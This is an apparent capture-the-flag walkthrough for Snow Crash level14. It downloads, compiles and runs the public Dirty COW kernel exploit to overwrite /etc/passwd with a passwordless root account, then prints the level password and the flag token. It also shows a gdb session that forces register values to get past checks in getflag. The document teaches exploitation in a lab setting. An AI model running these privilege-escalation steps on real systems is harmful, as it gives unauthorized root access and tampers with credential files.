Login as `level14`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level14
level14@192.168.1.64's password: 2A31L79asukciNyi8uppkEuSx
```
There is no file or binary to exploit in home directory. Search for what can be exploit.
```shell
level14@SnowCrash:~$ uname -a
Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
```
Linux kernel `< 4.8.3` (created before 2018) are vulnerable to **Dirty COW**[¹](https://dirtycow.ninja/).

Dirty COW allows privilege escalation by exploiting race condition on the copy-on-write mechanism.
```shell
level14@SnowCrash:~$ cd /tmp/
level14@SnowCrash:/tmp$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
level14@SnowCrash:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
level14@SnowCrash:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: <Enter>
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```
Login as `root`.
```shell
level14@SnowCrash:/tmp$ su firefart
Password: <Enter>
```
Login as `flag14` and get the flag.
```shell
firefart@SnowCrash:/tmp# su flag14
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
flag14@SnowCrash:~$ getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```




```gdb
level14@SnowCrash:~$ gdb /bin/getflag
(gdb) break main
Breakpoint 1 at 0x804894a
(gdb) run
Starting program: /bin/getflag

Breakpoint 1, 0x0804894a in main ()
(gdb) target record
(gdb) b *0x0804898e
Breakpoint 2 at 0x804898e
(gdb) continue
Continuing.

Breakpoint 2, 0x0804898e in main ()
(gdb) set $eax=42
(gdb) until
0x080489a8 in main () # Jumped on line
(gdb) until
0x080489a8 in main ()
(gdb) b *0x080489b4
Breakpoint 5 at 0x80489b4
(gdb) continue
Continuing.

Breakpoint 5, 0x080489b4 in main ()
(gdb) until
0x080489b6 in main ()
(gdb) until
0x080489ea in main () # Jumped on line
(gdb) b *0x080489fe
Note: breakpoints 6 and 7 also set at pc 0x80489fe.
Breakpoint 8 at 0x80489fe
(gdb) continue
Continuing.

Breakpoint 6, 0x080489fe in main ()
(gdb) until
0x08048a00 in main ()
(gdb) until
0x08048a34 in main () # Jumped on line
(gdb) b *0x08048a4c
Breakpoint 9 at 0x8048a4c
(gdb) continue
Continuing.

Breakpoint 9, 0x08048a4c in main ()
......

(gdb) b *0x08048ea5
Breakpoint 10 at 0x8048ea5
(gdb) continue
Continuing.

Breakpoint 10, 0x08048ea5 in main ()

```
